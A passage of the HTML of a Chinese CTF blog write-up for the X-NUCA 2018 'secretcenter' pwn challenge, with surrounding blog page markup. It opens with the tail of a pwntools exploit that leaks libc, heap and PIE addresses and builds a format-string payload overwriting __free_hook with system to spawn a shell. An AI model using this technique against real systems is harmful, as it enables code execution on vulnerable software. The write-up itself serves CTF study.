class="line"><span class="keyword">print</span> <span class="string">'[+]libc_address'</span>,hex(libc_address)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+]heap_address'</span>,hex(heap_address)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+]pie'</span>,hex(pie)</span><br><span class="line">now = <span class="number">0</span></span><br><span class="line">last= <span class="number">0</span></span><br><span class="line">fmt = (<span class="string">'%256p'</span>*<span class="number">33</span>)</span><br><span class="line">target = libc_address+libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">where  = libc_address+libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">	now = (target&gt;&gt;(i*<span class="number">8</span>))&amp;<span class="number">0xff</span></span><br><span class="line">	<span class="keyword">if</span> last&lt;now:</span><br><span class="line">		fmt+= <span class="string">'%'</span>+str(now-last)+<span class="string">'c'</span> + <span class="string">'%hhn'</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		fmt+= <span class="string">'%'</span>+str(<span class="number">0x100</span>+now-last)+<span class="string">'c'</span>+ <span class="string">'%hhn'</span></span><br><span class="line">	last =  now</span><br><span class="line"></span><br><span class="line">fmt+=<span class="string">';sh'</span></span><br><span class="line">fmt = fmt.ljust(<span class="number">0xe0</span>,<span class="string">'\0'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">	fmt+= p64(<span class="number">0x31</span>)+p64(where+i)	</span><br><span class="line">input(<span class="number">0x150</span>,fmt+<span class="string">'\0'</span>)<span class="comment">#9</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'fmt:'</span>,hex(len(fmt)),fmt</span><br><span class="line">p.recvuntil(<span class="string">'It\'s close.. Try to get a shell!'</span>)</span><br><span class="line">p.sendline(maps)</span><br><span class="line">delete()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>总之，题目考察了很多东西，还是很有意思的一道题目，感谢AFang师傅的帮助。</p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2018/11/26/XNUCA-secretcenter/">X-NUCA&#39;2018 secretcenter 解题思路</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">P4nda</a></p>
+        <p><span>发布时间:</span>2018-11-26, 10:54:00</p>
+        <p><span>最后更新:</span>2018-11-26, 12:38:54</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2018/11/26/XNUCA-secretcenter/" title="X-NUCA&#39;2018 secretcenter 解题思路">http://p4nda.top/2018/11/26/XNUCA-secretcenter/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://p4nda.top/2018/11/26/XNUCA-secretcenter/　　作者: P4nda" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2018/11/07/stringipc/">
+                    【KERNEL PWN】从内存任意读写到权限提升
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#题目及漏洞分析"><span class="toc-number">1.</span> <span class="toc-text">题目及漏洞分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#漏洞利用"><span class="toc-number">2.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#seccomp"><span class="toc-number">2.1.</span> <span class="toc-text">seccomp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fprintf-chk"><span class="toc-number">2.2.</span> <span class="toc-text">fprintf_chk</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fopen"><span class="toc-number">2.3.</span> <span class="toc-text">fopen</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用思路"><span class="toc-number">2.4.</span> <span class="toc-text">利用思路</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#沙箱构造"><span class="toc-number">2.4.1.</span> <span class="toc-text">沙箱构造</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP"><span class="toc-number">2.4.2.</span> <span class="toc-text">EXP</span></a></li></ol></li></ol></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+        <div class="bdsharebuttonbox">
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"X-NUCA'2018 secretcenter 解题思路　| p4nda's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
+
+    
+</div>
+
+
+
+
+
+
+
+    
+        <section id="comments">
+    <style> aside.comment-bar { margin: auto 30px; }</style>
+    <div id="disqus_thread"></div>
+    <script>
+        var disqus_config = function(){
+            this.page.url = 'http://p4nda.top/2018/11/26/XNUCA-secretcenter/';
+            this.page.identifier = '2018/11/26/XNUCA-secretcenter/';
+        };
+        var loadComment = function(){
+            var d = document, s = d.createElement('script');
+            s.src = '//p4nda.disqus.com/embed.js';
+            s.setAttribute('data-timestamp', +new Date());
+            (d.head || d.body).appendChild(s);
+        }
+    </script>
+    
+    <script> loadComment(); </script>
+
+</section>
+
+
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2018/11/07/stringipc/" title="下一篇: 【KERNEL PWN】从内存任意读写到权限提升">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2018/11/26/XNUCA-secretcenter/">X-NUCA'2018 secretcenter 解题思路</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/11/07/stringipc/">【KERNEL PWN】从内存任意读写到权限提升</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/10/14/hwb-ctf-2018/">护网杯 CTF 2018线上预选赛PWN题解</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/10/11/ciscn-2017-babydriver/">【KERNEL PWN】CISCN 2017 babydriver题解</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/08/27/WDBCTF-2018/">网鼎杯CTF部分PWN题复现</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/27/CISCN-Final/">CISCN 2018 Final赛记</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/20/0ctf-baby/">【KERNEL PWN】0ctf 2018 final baby题解</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/13/ciscn2018-core/">【KERNEL PWN】强网杯CTF2018 core题解</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/11/WCTF-2018/">【WCTF 2018】parrot_revenge 题解</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/02/patch-in-pwn/">CTF线下赛中常用的PWN题patch方法</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/28/pwnable-tw-wannaheap/">【PWNABLE.TW】 wannaheap 解题思路</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/25/pwnhub_Panda's_gift/">胖哈勃Panda's gift 及 TSCTF 2018 FINAL出题笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/29/suctf2018/">SUCTF 2018部分PWN题复现</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/13/ciscn-ctf-2018/">全国大学生信息安全竞赛（CISCN）解题赛部分PWN题解</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/18/house-of-rabbit/">House Of Rabbit 原理</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/17/hitb2018/">HITB gsec CTF Qual 2018 部分PWN题解</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/04/kernel-pwn-start/">CTF KETNEL PWN 入门记录</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/04/0ctf2018/">0ctf 2018 PWN 部分题解</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/27/QWB2018/">QWBCTF 2018 PWN 部分题解</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/20/tcache/">tcache 源码分析及利用思路</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/15/n1ctf2018/">N1CTF 2018 && 线程堆知识源代码分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/06/hgame/">HGAME 2018 PWN题记录</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/03/question/">问题解决及工具使用</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/05/hitctf/">HITCTF 2018 PWN 题记录</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/15/pwnable-tw-bookwriter/">【PWNABLE.TW】 BookWriter 解题思路</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/06/pwnable-tw-alivenote/">【PWNABLE.TW】 alive_note 解题思路</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/13/pwnable-tw-starbound/">【PWNABLE.TW】 starbound 解题思路</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/29/pwnable-tw-deathnote/">【PWNABLE.TW】 deathnote 解题思路</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/20/pwnable-tw-seethefile/">【PWNABLE.TW】 seethefile 解题思路</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/14/pwnable-tw-applestore/">【PWNABLE.TW】 applestore 解题思路</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2017-2018 P4nda
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+    </div>
+    
+    <script src="/js/GithubRepoWidget.js"></script>
+
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+             github: ".github-widget a", 
+            
+            
+            
+            
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+
+    <script>
+        var originTitle = document.title;
+        var titleTime;
+        document.addEventListener("visibilitychange", function() {
+            if (document.hidden) {
+                document.title = "(つェ⊂) 天黑了~ " + originTitle;
+                clearTimeout(titleTime);
+            }
+            else {
+                document.title = "(*´∇｀*) 天亮了~ " + originTitle;
+                titleTime = setTimeout(function() {
+                    document.title = originTitle;
+                }, 2000);
+            }
+        })
+    </script>
+
+<script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"scale":0.5,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2dw/assets/koharu.model.json"},"mobile":{"show":false,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.2},"pluginJsPath":"lib/","pluginRootPath":"live2dw/"});</script></body>
+</html>
